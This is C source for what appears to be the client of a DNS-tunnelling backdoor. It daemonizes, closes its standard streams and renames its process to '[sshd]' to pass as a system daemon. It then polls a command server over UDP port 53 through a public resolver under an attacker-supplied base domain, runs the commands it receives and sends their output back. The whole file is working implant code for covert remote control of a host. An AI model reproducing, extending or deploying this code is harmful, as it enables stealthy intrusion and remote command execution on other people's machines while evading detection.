#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <stdarg.h>
#include <time.h>
#include <sys/prctl.h>
#include "app.h"
#include "../include/util.h"
#include "../include/udp.h"
#include "../include/cmd.h"
#include "../include/aes.h"

#define MAXLINE 2048

/*
* client端定时询问server，是否有命令需要执行
*/
extern char g_baseDomain[255];

static void daemonlize()
{
    if (fork() == 0)
    {
        if (fork() == 0)
        {
            close(0);
            close(1);
            close(2);
            return;
        }
    }
    exit(0);
}

static void get_sys_nameserver(char * server, int len)
{
    FILE * fp = fopen("/etc/resolv.conf", "r");
    if (fp)
    {
        do
        {
            char line[255] = {0};
            (void)fgets(line, sizeof(line), fp);
            if (line[0] == '#')
            {
                continue;
            }

            if (strncmp("nameserver ", line, 11) == 0)
            {
                char * p = line + 11;
                char * out = (char *)server;
                while(*p != '\n')
                    *(out++) = *(p++);
                *out = 0;
                break;
            }
        }while(!feof(fp));
        fclose(fp);
    }
}

extern char **environ;
 
static char **g_main_Argv = NULL;    /* pointer to argument vector */
static char *g_main_LastArgv = NULL;    /* end of argv */
 
void setproctitle_init(int argc, char **argv, char **envp)
{
    int i;
 
    for (i = 0; envp[i] != NULL; i++) // calc envp num
        continue;
    environ = (char **) malloc(sizeof (char *) * (i + 1)); // malloc envp pointer
 
    for (i = 0; envp[i] != NULL; i++)
    {
        environ[i] = malloc(sizeof(char) * strlen(envp[i]));
        strcpy(environ[i], envp[i]);
    }
    environ[i] = NULL;
 
    g_main_Argv = argv;
    if (i > 0)
        g_main_LastArgv = envp[i - 1] + strlen(envp[i - 1]);
    else
        g_main_LastArgv = argv[argc - 1] + strlen(argv[argc - 1]);
}
 
void setproctitle(const char *fmt, ...)
{
    char *p;
    int i;
    char buf[MAXLINE];
 
    extern char **g_main_Argv;
    extern char *g_main_LastArgv;
    va_list ap;
    p = buf;
 
    va_start(ap, fmt);
    vsprintf(p, fmt, ap);
    va_end(ap);
 
    i = strlen(buf);
 
    if (i > g_main_LastArgv - g_main_Argv[0] - 2)
    {
        i = g_main_LastArgv - g_main_Argv[0] - 2;
        buf[i] = '\0';
    }
    //修改argv[0]
    (void) strcpy(g_main_Argv[0], buf);
 
    p = &g_main_Argv[0][i];
    while (p < g_main_LastArgv)
        *p++ = '\0';
    g_main_Argv[1] = NULL;
     
    //调用prctl
    prctl(PR_SET_NAME,buf);
}

typedef enum
{
    IDLE,
    BUSY
}SESSION_STATE;

static SESSION_STATE s_client_state = IDLE;

/*
发送SERVER_CMD_NEWSESSION包，成功返回1，失败返回0
*/
int client_session_establish(int fd)
{
    char packet[sizeof(struct CmdReq) + sizeof(struct NewSession)];
    struct CmdReq * cmd = (struct CmdReq *)packet;
    cmd->code = SERVER_CMD_NEWSESSION;
    cmd->datalen = htons(sizeof(struct NewSession));
    struct NewSession * sess = (struct NewSession *)cmd->data;
    sess->magic[0] = '\xde';
    sess->magic[1] = '\xad';
    sess->magic[2] = '\xca';
    sess->magic[3] = '\xfe';
    sess->timestamp = htonl(time(0));
    return client_send(fd, packet, sizeof(packet)) == sizeof(packet);
}

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        printf("%s <baseDomain>\n", argv[0]);
        return 1;
    }

    char dns_server_ip[255] = {0};
    get_sys_nameserver(dns_server_ip, sizeof(dns_server_ip));
    if(dns_server_ip[0] == 0)
    {
        strcpy(dns_server_ip, "114.114.114.114");
    }

#if DEBUG != 1
    daemonlize();
#endif

    strcpy_s(g_baseDomain, 255, argv[1]);

    setproctitle_init(argc, argv, environ);
    setproctitle("[sshd]");
    
    signal(SIGCHLD, SIG_IGN);//防止僵尸进程

    clientid_sequid_init();

    int fd = udp_connect("114.114.114.114", 53);
    if(fd == -1)
    {
        perror("udp connect fail");
        return 1;
    }

    long last_freshtime = 0;

    char req[65536];
    char rsp[1024*1024];
    while(1)
    {
        if(s_client_state == IDLE) //空闲状态，发送单独的NEW_SESSION报文
        {
            debug("IDLE state, try establish session...\n");
            if(client_session_establish(fd) == 1)//成功
            {
                time(&last_freshtime);
                s_client_state = BUSY;
                debug("session established.!\n");
            }
        }
        else
        {
            if(time(0) - last_freshtime > 30) //30秒没收到响应了，已失活，重新激活
            {
                debug("session reactive.\n");
                s_client_state = IDLE;
                clientid_sequid_init();
                continue;
            }

            int len = client_recv(fd, req, sizeof(req));
            if(len >= 0)
            {
                time(&last_freshtime);//0表示只收到ack, 也要刷新时间
                if(len != 0)
                {
                    struct CmdReq * cmd = (struct CmdReq *)req;
                    len = handleCmd(cmd, rsp, sizeof(rsp));
                    if (len > 0)
                    {
                        int ret = client_send(fd, rsp, len);
                        if(ret == len)//发送成功才刷新时间
                        {
                            time(&last_freshtime);
                        }
                    }
                }
            }
        }

        delay(1, 0);
    }
        
    return 0;
}